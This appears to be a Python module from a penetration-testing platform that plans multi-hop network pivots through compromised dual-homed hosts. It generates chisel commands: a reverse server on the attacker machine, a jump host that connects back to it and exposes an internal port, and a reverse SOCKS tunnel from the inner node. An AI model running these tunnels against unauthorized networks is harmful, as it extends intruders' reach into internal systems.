"""多级中继推导（与 assets/js/views/proxy.js 逐条一致）。

前端 proxy.js 的规则：
  1. `nextSegmentOf(host)`：双网卡主机取「第二块网卡所在网段」作为可继续内打的目标网段；
     否则按 segments 顺序取下一段。
  2. `findUpstream(host)`：找到一条 status=alive 且 targetSegment == 主机所在网段的链路
     作为上一层代理。
  3. `addrIn(host, segment)`：取主机在指定网段里的 IP（来自 ifaces，不是主 IP）。
  4. `relayAddr = addrIn(上一层跳板, 本层主机所在网段) + ':' + upstream.listenPort`。

本模块把同一套推导放到服务端（半自动档生成命令、自动档编排、测试断言共用一处）。
"""

from __future__ import annotations

from dataclasses import dataclass, field


def addr_in(host, segment: str) -> str:
    """取主机在指定网段里的地址（找不到回落主 IP）——与前端 addrIn 一致。"""
    for i in (getattr(host, "ifaces", None) or []):
        if i.get("segment") == segment and i.get("ip"):
            return i["ip"]
    return getattr(host, "ip", "") or ""


def is_dual_homed(host) -> bool:
    return len(getattr(host, "ifaces", None) or []) > 1


def next_segment_of(host, segments: list[str]) -> str:
    """与前端 nextSegmentOf 一致：双网卡取第二块网卡段，否则取全局下一段。"""
    ifaces = getattr(host, "ifaces", None) or []
    if len(ifaces) > 1:
        idx = next((n for n, i in enumerate(ifaces) if i.get("segment") == host.segment), -1)
        nxt = ifaces[idx + 1] if idx >= 0 and idx + 1 < len(ifaces) else (ifaces[1] if len(ifaces) > 1 else None)
        if nxt and nxt.get("segment"):
            return nxt["segment"]
    try:
        gi = list(segments).index(host.segment)
    except ValueError:
        return host.segment
    return segments[gi + 1] if gi + 1 < len(segments) else host.segment


def find_upstream(links, host) -> object | None:
    """与前端 findUpstream 一致：alive 且 targetSegment == 主机所在网段的链路。"""
    for l in links or []:
        if l.status == "alive" and l.target_segment == host.segment:
            return l
    return None


@dataclass
class RelayPlan:
    """多级中继推导结果（供半自动档/自动档共用）。"""

    fromHostId: str = ""
    relayHostId: str = ""
    relayAddr: str = ""
    relayPort: int = 0
    targetSegment: str = ""
    listenPort: int = 0
    upstreamLinkId: str = ""
    dualHomed: bool = False
    hops: list[dict] = field(default_factory=list)
    reason: str = ""

    def to_dict(self) -> dict:
        return {
            "fromHostId": self.fromHostId, "relayHostId": self.relayHostId,
            "relayAddr": self.relayAddr, "relayPort": self.relayPort,
            "targetSegment": self.targetSegment, "listenPort": self.listenPort,
            "upstreamLinkId": self.upstreamLinkId, "dualHomed": self.dualHomed,
            "hops": self.hops, "reason": self.reason,
        }


def plan_relay(host, hosts_by_id: dict, links: list, segments: list[str],
               lhost: str = "", listen_port: int = 1331) -> RelayPlan:
    """按前端规则推导中继入口地址与三步命令。

    host：本层节点（通常是双网卡机）；hosts_by_id：{id: Host}；links：项目内链路。
    """
    target_segment = next_segment_of(host, segments)
    upstream = find_upstream(links, host)
    plan = RelayPlan(
        fromHostId=host.id, targetSegment=target_segment, listenPort=int(listen_port),
        dualHomed=is_dual_homed(host),
    )
    if upstream is None:
        plan.reason = (f"本层节点（{host.ip}）可直接回连攻击机，无需中继"
                       f"（未找到覆盖 {host.segment} 的存活上游链路）")
        return plan

    relay_host = hosts_by_id.get(upstream.from_host_id)
    if relay_host is None:
        plan.reason = f"上游链路 {upstream.id} 的入口主机不存在"
        return plan

    plan.upstreamLinkId = upstream.id
    plan.relayHostId = relay_host.id
    # 关键规则：中继地址 = 上一层跳板在「本层网段」里的 IP（取自 ifaces，不是主 IP）
    plan.relayAddr = addr_in(relay_host, host.segment)
    plan.relayPort = int(upstream.listen_port or listen_port)
    plan.reason = (f"{host.ip}（{host.hostname or ''}）无法直接回连攻击机，需先由上层跳板 "
                   f"{relay_host.ip} 把 {plan.listenPort} 端口暴露到其内网口 "
                   f"{plan.relayAddr}:{plan.relayPort}，再由此节点接入")
    if lhost:
        plan.hops = build_relay_hops(lhost, plan.listenPort, plan.relayAddr, plan.relayPort,
                                      relay_host.id, host.id, local_port=0, bind="0.0.0.0")
    return plan


def build_relay_hops(lhost: str, listen_port: int, relay_addr: str, relay_port: int,
                     relay_host_id: str, node_host_id: str, local_port: int = 0,
                     bind: str = "0.0.0.0", remote_bin: str = "./chisel",
                     auth: str = "") -> list[dict]:
    """三步命令（与前端 proxy.js relay 分支逐字一致）。"""
    listen = int(listen_port)
    auth_s = f" --auth {auth}" if auth else ""
    lport = int(local_port or 0)
    hops = [
        {"role": "攻击机监听", "hostId": "h-attacker",
         "cmd": f"{remote_bin} server -p {listen} --reverse{auth_s}"},
        {"role": "上层跳板中继（暴露内网口）", "hostId": relay_host_id,
         "cmd": f"{remote_bin} client{auth_s} {lhost}:{listen} {int(relay_port)}:{listen}"},
    ]
    if lport:
        hops.append({
            "role": "本层双网卡节点回连", "hostId": node_host_id,
            "cmd": f"{remote_bin} client{auth_s} {relay_addr}:{int(relay_port)} "
                   f"R:{bind}:{lport}:socks",
        })
    return hops
